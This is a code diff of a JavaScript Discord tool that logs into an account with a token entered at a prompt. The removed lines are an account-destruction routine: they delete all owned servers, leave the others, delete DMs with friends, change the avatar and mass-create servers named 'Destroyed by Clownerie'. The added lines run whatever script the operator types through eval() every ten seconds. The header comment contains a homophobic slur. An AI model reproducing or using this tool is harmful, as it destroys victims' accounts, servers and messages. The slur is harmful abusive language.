@@ -5,6 +5,8 @@ Don't skid, faggot
 import * as Discord from "discord.js"
 import * as readline from 'readline'
 
+let a = 1
+
 let rl = readline.createInterface({
     input: process.stdin,
   output: process.stdout
@@ -18,32 +20,19 @@ rl.question('Entrez le token : ', (token) => {
 
 })
 
+function bite(){
+
+    rl.question('Entrez le script a executer : ', (script) => {
+
+        try{
+            const evalee = eval(script)
+     } catch(e) {console.log(e)}
+    })
+    setTimeout(bite, 10000)
+}
+
 client.once('ready', () => {
 
-    console.clear
-    console.info('Connecté')
+    bite()
 
-    function cGuilds(){
-
-        var nguild = ["Destroyed BY CWN", "Destroyed By Clownerie", "DestROYed bY cloWNerie", "DeStRoYeD bY cLoWnEriE", "NIQUED BY CLOWNERIE"]
-        var nguilds = nguild[Math.floor(Math.random()*nguild.length)]
-
-        for(var i = 100; i >= 0; i--) {
-            client.user.createGuild(nguilds, 'europe', null)
-    }
-    }
-    
-    function lGuilds(){
-    
-        client.guilds.map((g) => { g.leave().catch(console.error)})
-    
-    }
-    
-    console.info('Destroying...')
-    client.guilds.map((g) => { g.delete().catch(console.error)})
-    client.user.setAvatar('https://cdn.discordapp.com/attachments/733972937425813516/775078883531030548/clown.png')
-    client.user.friends.map((f) => {f.deleteDM().catch(console.error)})
-    
-    setTimeout(lGuilds, 1000)
-    setTimeout(cGuilds, 5000)
 })
